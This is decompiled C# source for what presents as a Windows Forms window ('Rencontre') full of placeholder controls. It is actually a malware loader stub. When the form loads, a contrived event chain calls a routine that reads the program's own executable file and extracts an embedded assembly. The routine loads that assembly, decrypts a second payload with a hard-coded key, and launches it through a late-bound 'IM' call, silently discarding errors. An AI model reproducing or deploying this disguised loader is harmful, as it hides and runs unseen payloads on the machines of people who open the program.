using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Sirene;

[DesignerGenerated]
public class Rencontre : Form
{
	public delegate void myFirstDelegate();

	private IContainer components;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("DateTimePicker1")]
	private DateTimePicker _DateTimePicker1;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("MaskedTextBox1")]
	private MaskedTextBox _MaskedTextBox1;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown _NumericUpDown1;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox _RichTextBox1;

	[AccessedThroughProperty("MonthCalendar1")]
	private MonthCalendar _MonthCalendar1;

	public string DL;

	public byte[] jacki;

	public Assembly ass;

	public int chch;

	public Type pita;

	public object king;

	internal virtual ListView ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListView1 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual DateTimePicker DateTimePicker1
	{
		get
		{
			return _DateTimePicker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DateTimePicker1 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual MaskedTextBox MaskedTextBox1
	{
		get
		{
			return _MaskedTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MaskedTextBox1 = value;
		}
	}

	internal virtual NumericUpDown NumericUpDown1
	{
		get
		{
			return _NumericUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = NumericUpDown1_RightToLeftChanged;
			if (_NumericUpDown1 != null)
			{
				((Control)_NumericUpDown1).remove_RightToLeftChanged(eventHandler);
			}
			_NumericUpDown1 = value;
			if (_NumericUpDown1 != null)
			{
				((Control)_NumericUpDown1).add_RightToLeftChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton1
	{
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual RichTextBox RichTextBox1
	{
		get
		{
			return _RichTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RichTextBox1 = value;
		}
	}

	internal virtual MonthCalendar MonthCalendar1
	{
		get
		{
			return _MonthCalendar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MonthCalendar1 = value;
		}
	}

	public Rencontre()
	{
		((Form)this).add_Load((EventHandler)Rencontre_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		ListView1 = new ListView();
		CheckBox1 = new CheckBox();
		Button1 = new Button();
		DateTimePicker1 = new DateTimePicker();
		LinkLabel1 = new LinkLabel();
		Label1 = new Label();
		MaskedTextBox1 = new MaskedTextBox();
		NumericUpDown1 = new NumericUpDown();
		RadioButton1 = new RadioButton();
		ProgressBar1 = new ProgressBar();
		RichTextBox1 = new RichTextBox();
		MonthCalendar1 = new MonthCalendar();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((Control)this).SuspendLayout();
		ListView listView = ListView1;
		Point location = new Point(115, 91);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		ListView listView2 = ListView1;
		Size size = new Size(121, 97);
		((Control)listView2).set_Size(size);
		((Control)ListView1).set_TabIndex(0);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(354, 73);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(1);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Button button = Button1;
		location = new Point(239, 40);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		DateTimePicker dateTimePicker = DateTimePicker1;
		location = new Point(637, 130);
		((Control)dateTimePicker).set_Location(location);
		((Control)DateTimePicker1).set_Name("DateTimePicker1");
		DateTimePicker dateTimePicker2 = DateTimePicker1;
		size = new Size(200, 20);
		((Control)dateTimePicker2).set_Size(size);
		((Control)DateTimePicker1).set_TabIndex(3);
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(549, 191);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(4);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(471, 191);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(5);
		Label1.set_Text("Label1");
		MaskedTextBox maskedTextBox = MaskedTextBox1;
		location = new Point(263, 282);
		((Control)maskedTextBox).set_Location(location);
		((Control)MaskedTextBox1).set_Name("MaskedTextBox1");
		MaskedTextBox maskedTextBox2 = MaskedTextBox1;
		size = new Size(100, 20);
		((Control)maskedTextBox2).set_Size(size);
		((Control)MaskedTextBox1).set_TabIndex(6);
		NumericUpDown numericUpDown = NumericUpDown1;
		location = new Point(422, 367);
		((Control)numericUpDown).set_Location(location);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		NumericUpDown numericUpDown2 = NumericUpDown1;
		size = new Size(120, 20);
		((Control)numericUpDown2).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(7);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(107, 334);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(8);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(66, 243);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(100, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(9);
		RichTextBox richTextBox = RichTextBox1;
		location = new Point(670, 315);
		((Control)richTextBox).set_Location(location);
		((Control)RichTextBox1).set_Name("RichTextBox1");
		RichTextBox richTextBox2 = RichTextBox1;
		size = new Size(109, 59);
		((Control)richTextBox2).set_Size(size);
		((Control)RichTextBox1).set_TabIndex(10);
		RichTextBox1.set_Text("");
		MonthCalendar monthCalendar = MonthCalendar1;
		location = new Point(351, 150);
		((Control)monthCalendar).set_Location(location);
		((Control)MonthCalendar1).set_Name("MonthCalendar1");
		((Control)MonthCalendar1).set_TabIndex(11);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(886, 525);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)MonthCalendar1);
		((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)RadioButton1);
		((Control)this).get_Controls().Add((Control)(object)NumericUpDown1);
		((Control)this).get_Controls().Add((Control)(object)MaskedTextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)DateTimePicker1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Control)this).set_Name("Rencontre");
		((Form)this).set_Text("Rencontre");
		((ISupportInitialize)NumericUpDown1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Rencontre_Load(object sender, EventArgs e)
	{
		Rencontre rencontre = new Rencontre();
		((Control)rencontre.NumericUpDown1).set_RightToLeft((RightToLeft)1);
	}

	private void NumericUpDown1_RightToLeftChanged(object sender, EventArgs e)
	{
		myFirstDelegate myFirstDelegate = main;
		myFirstDelegate();
		ProjectData.EndApp();
	}

	public string[] SP()
	{
		string text = GE2(File.ReadAllBytes(Assembly.GetEntryAssembly()!.Location));
		return Strings.Split(text, "$x$", -1, (CompareMethod)0);
	}

	public byte[] GE1(string check)
	{
		return Encoding.Default.GetBytes(check);
	}

	public string GE2(byte[] check)
	{
		return Encoding.Default.GetString(check);
	}

	public void main()
	{
		try
		{
			DL = SP()[2];
			jacki = GE1(DL);
			ass = Assembly.Load(jacki);
			pita = ass.GetType("PP.PP");
			king = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(pita));
			string check = SP()[1];
			string check2 = Sandwich(GE1(check), "sodomie");
			byte[] array = GE1(check2);
			object obj = king;
			object[] array2 = new object[4]
			{
				array,
				'A',
				"_Start",
				new object[0]
			};
			bool[] array3 = new bool[4] { true, false, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "IM", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string Sandwich(byte[] inpat, string pepe)
	{
		object obj = king;
		object[] array = new object[2] { inpat, pepe };
		bool[] array2 = new bool[2] { true, true };
		object obj2 = NewLateBinding.LateGet(obj, (Type)null, "Petore", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			inpat = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
		}
		if (array2[1])
		{
			pepe = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
		}
		return Conversions.ToString(obj2);
	}

	public bool FileInUse(string sFile)
	{
		bool result = default(bool);
		if (File.Exists(sFile))
		{
			try
			{
				short num = checked((short)FileSystem.FreeFile());
				FileSystem.FileOpen((int)num, sFile, (OpenMode)32, (OpenAccess)3, (OpenShare)0, -1);
				FileSystem.FileClose(new int[1] { num });
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = true;
				ProjectData.ClearProjectError();
				return result;
			}
		}
		return result;
	}

	public int MaxValOfIntArray(ref object TheArray)
	{
		int num = 0;
		int num2 = Information.UBound((Array)TheArray, 1);
		for (int i = 1; i <= num2; i = checked(i + 1))
		{
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(TheArray, new object[1] { i }, (string[])null), NewLateBinding.LateIndexGet(TheArray, new object[1] { num }, (string[])null), false))
			{
				num = i;
			}
		}
		return Conversions.ToInteger(NewLateBinding.LateIndexGet(TheArray, new object[1] { num }, (string[])null));
	}

	public long GetFolderSize(string DirPath, bool IncludeSubFolders = true)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(DirPath);
		checked
		{
			long num = default(long);
			try
			{
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					num += fileInfo.Length;
				}
				if (IncludeSubFolders)
				{
					DirectoryInfo[] directories = directoryInfo.GetDirectories();
					foreach (DirectoryInfo directoryInfo2 in directories)
					{
						num += GetFolderSize(directoryInfo2.FullName);
					}
					return num;
				}
				return num;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return num;
			}
		}
	}
}
